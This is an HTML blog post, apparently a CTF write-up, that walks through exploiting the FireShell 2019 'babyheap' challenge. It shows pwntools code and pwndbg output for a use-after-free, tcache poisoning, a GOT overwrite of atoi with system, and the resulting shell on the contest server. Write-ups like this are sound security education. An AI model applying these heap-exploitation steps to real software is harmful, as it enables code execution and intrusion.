@@ -1,0 +1,254 @@
+<!doctype html>
+
+<html lang="en-us">
+
+<head>
+  <title>Catousify</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="The HTML5 Herald" />
+  <meta name="author" content="kiror0" /><meta name="generator" content="Hugo 0.62.0" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.0/normalize.min.css" />
+  <script src="https://kit.fontawesome.com/b76b73e8e8.js" crossorigin="anonymous"></script>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab|Ruda" />
+  <link rel="stylesheet" type="text/css" href="http://zeroload.github.io/ctf/css/styles.css" /></head>
+
+<body>
+  <div id="container">
+    <header>
+      <h1>
+                <a href="http://zeroload.github.io/ctf/">Catousify</a>
+            </h1>
+
+      <ul id="social-media">
+        
+        
+          
+        <li><a href="https://github.com/kiror0"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a></li>
+           
+      </ul>
+      
+      <p><em>No Clever Tagline Needed.</em></p>
+      
+    </header>
+
+    
+<nav>
+    <ul>
+        
+        <li>
+            <a class="" href="http://zeroload.github.io/ctf/posts/">
+                <i class="fa-li fa  fa-lg"></i><span>Posts</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="http://zeroload.github.io/ctf/about/">
+                <i class="fa-li fa  fa-lg"></i><span>About Me</span>
+            </a>
+        </li>
+        
+    </ul>
+</nav>
+
+    <main>
+
+
+
+
+<article>
+
+    <h1>FireShell 2019 - babyheap</h1>
+
+    
+        <aside>
+    <ul>
+        <li>
+            <time class="post-date" datetime="2019-01-28T06:54:34Z">Jan 28, 2019</time>
+        </li>
+        
+        <li>
+            Categories:
+            <em>
+                
+                    
+                    <a href="http://zeroload.github.io/ctf/categories/pwn">pwn</a>
+                
+                    , 
+                    <a href="http://zeroload.github.io/ctf/categories/writeup">writeup</a>
+                
+            </em>
+        </li>
+        
+
+        
+
+        <li>3 minutes read</li>
+    </ul>
+</aside>
+
+    
+
+    <h2 id="downloads">downloads</h2>
+<ul>
+<li><a href="http://zeroload.github.io/ctf/assets/fireshell/babyheap/babyheap.zip">binary</a></li>
+<li><a href="http://zeroload.github.io/ctf/assets/fireshell/babyheap/libc.so.6">libc.so.6</a></li>
+<li><a href="http://zeroload.github.io/ctf/assets/fireshell/babyheap/solve.py">solve.py</a></li>
+</ul>
+<h2 id="summary">summary</h2>
+<ol>
+<li><code>create</code>, <code>edit</code>, <code>show</code>, <code>delete</code>, and <code>fill</code>, each functions can only be used once.</li>
+<li>UAF in <code>delete</code>, after chunk gets freed but didn't <code>NULL</code> the buf pointer.</li>
+<li><code>delete</code> will reset the <code>create</code> &lsquo;consumption&rsquo;, but you can't <code>delete</code> again after that.</li>
+<li>Use tcache-poisoning to control heap return arbritrary address</li>
+</ol>
+<h2 id="exploit">exploit</h2>
+<p>A brief helper function,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fill</span>(buf):
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1337</span><span style="color:#e6db74">&#39;</span>)
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Fill </span><span style="color:#e6db74">&#39;</span>, buf)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create</span>():
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#39;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">edit</span>(buf):
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">2</span><span style="color:#e6db74">&#39;</span>)
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Content? </span><span style="color:#e6db74">&#39;</span>, buf)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>():
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">3</span><span style="color:#e6db74">&#39;</span>)
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">Content: </span><span style="color:#e6db74">&#39;</span>)
+    <span style="color:#66d9ef">return</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">----</span><span style="color:#e6db74">&#39;</span>, drop<span style="color:#f92672">=</span>True)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete</span>():
+    r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">4</span><span style="color:#e6db74">&#39;</span>)
+</code></pre></div><p>trigger free to put tcache,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">create() <span style="color:#75715e"># init tcache, heap, ...</span>
+
+<span style="color:#75715e"># pwndbg&gt; x/6gx 0x6020a0</span>
+<span style="color:#75715e"># 0x6020a0:       0x0000000000000001      0x0000000000000000</span>
+<span style="color:#75715e">#                   ^-- create used</span>
+<span style="color:#75715e"># 0x6020b0:       0x0000000000000000      0x0000000000000000</span>
+<span style="color:#75715e"># 0x6020c0:       0x0000000000000000      0x0000000002050250</span>
+<span style="color:#75715e">#                                           ^-- buf</span>
+
+delete() <span style="color:#75715e"># trigger UAF</span>
+
+<span style="color:#75715e"># pwndbg&gt; x/6gx 0x6020a0</span>
+<span style="color:#75715e"># 0x6020a0:       0x0000000000000000      0x0000000000000000</span>
+<span style="color:#75715e">#                   ^-- create reset</span>
+<span style="color:#75715e"># 0x6020b0:       0x0000000000000000      0x0000000000000001</span>
+<span style="color:#75715e">#                                           ^-- delete used</span>
+<span style="color:#75715e"># 0x6020c0:       0x0000000000000000      0x0000000002050250</span>
+
+<span style="color:#75715e"># pwndbg&gt; tcachebins</span>
+<span style="color:#75715e"># tcachebins</span>
+<span style="color:#75715e"># 0x70 [  1]: 0x2050250 ◂— 0x0</span>
+</code></pre></div><p>use UAF to <em>poison</em> tcache free list, put .bss + 0x20 to control function <em>&lsquo;consumption&rsquo;</em>
+and buf pointer.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">edit(p64(elf<span style="color:#f92672">.</span>bss(<span style="color:#ae81ff">0x20</span>))) <span style="color:#75715e"># 0x6020a0, function &#39;consumption&#39; and buf pointer</span>
+
+<span style="color:#75715e"># pwndbg&gt; dq 0x2050250</span>
+<span style="color:#75715e"># 0000000002050250     0000000000000000 0000000000000071</span>
+<span style="color:#75715e"># 0000000002050260     00000000006020a0 0000000000000000</span>
+<span style="color:#75715e"># 0000000002050270     0000000000000000 0000000000000000</span>
+<span style="color:#75715e"># 0000000002050280     0000000000000000 0000000000000000</span>
+
+<span style="color:#75715e"># pwndbg&gt; tcachebins </span>
+<span style="color:#75715e"># tcachebins</span>
+<span style="color:#75715e"># 0x70 [  1]: 0x2050260 —▸ 0x6020a0 ◂— 0x0</span>
+</code></pre></div><p>Second next <code>malloc(0x68)</code> request will create a chunk at <code>0x6020a0</code>,
+and we could fill it with bunch of <code>NULL</code>s to control funtion <em>&lsquo;consumption&rsquo;</em>,
+plus overwrite buf pointer to gain arbitrary read/write, in here I'll use GOT <code>atoi</code>
+as it'll be easier to leak libc and overwrite it with <code>system</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">create() <span style="color:#75715e"># first request</span>
+
+<span style="color:#75715e"># pwndbg&gt; tcachebins </span>
+<span style="color:#75715e"># tcachebins</span>
+<span style="color:#75715e"># 0x70 [  0]: 0x6020a0 ◂— 0x1</span>
+
+payload  <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># fill bunch of NULLs</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># fill bunch of NULLs</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># fill bunch of NULLs</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># fill bunch of NULLs</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0</span>) <span style="color:#75715e"># fill bunch of NULLs</span>
+payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">atoi</span><span style="color:#e6db74">&#39;</span>]) <span style="color:#75715e"># buf, get r/w, 0x602060</span>
+fill(payload) <span style="color:#75715e"># second request</span>
+
+<span style="color:#75715e"># pwndbg&gt; tcachebins </span>
+<span style="color:#75715e"># tcachebins</span>
+<span style="color:#75715e"># 0x70 [ -1]: 0x1</span>
+
+<span style="color:#75715e"># pwndbg&gt; dq 0x6020a0</span>
+<span style="color:#75715e"># 00000000006020a0     0000000000000000 0000000000000000</span>
+<span style="color:#75715e"># 00000000006020b0     0000000000000000 0000000000000000</span>
+<span style="color:#75715e"># 00000000006020c0     0000000000000001 0000000000602060</span>
+<span style="color:#75715e">#                       ^-- fill used    ^-- buf controlled</span>
+</code></pre></div><p>leak libc with <code>show</code> and overwrite <code>atoi</code> with <code>system</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(show()<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">atoi</span><span style="color:#e6db74">&#39;</span>]
+
+edit(p64(libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#39;</span>]))
+</code></pre></div><p>Trigger <code>atoi('/bin/sh')</code> which is now <code>system('/bin/sh')</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">r<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&gt; </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#e6db74">&#39;</span>)
+</code></pre></div><p>Profit.</p>
+<h2 id="flag">flag</h2>
+<pre><code>[+] Opening connection to 35.243.188.20 on port 2000: Done
+[*] Switching to interactive mode
+$ ls
+babyheap
+babyheap.sh
+flag.txt
+$ cat flag.txt
+F#{W3lc0m3_t0_h34p_Expl01t4t10n!}$
+[*] Interrupted
+[*] Closed connection to 35.243.188.20 port 2000
+</code></pre>
+
+</article>
+
+
+<section class="post-nav">
+    <ul>
+        
+        <li>
+            <a href="http://zeroload.github.io/ctf/posts/fireshell-2019-casino/"><i class="fa fa-chevron-circle-left"></i> FireShell 2019 - casino</a>
+        </li>
+        
+        
+        <li>
+            <a href="http://zeroload.github.io/ctf/posts/fireshell-2019-quotes-list/">FireShell 2019 - quotes_list <i class="fa fa-chevron-circle-right"></i> </a>
+        </li>
+        
+    </ul>
+</section>
+    
+
+
+
+
+
+</main>
+    <footer>
+        <h6>Copyright © 2019 - kiror0 |
+            Rendered by <a href="https://gohugo.io" title="Hugo">Hugo</a> |
+            <a href="http://zeroload.github.io/ctf/index.xml">Subscribe</a></h6>
+    </footer>
+</div>
+<script src="http://zeroload.github.io/ctf/js/scripts.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-146594173-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+</body>
+
+</html>
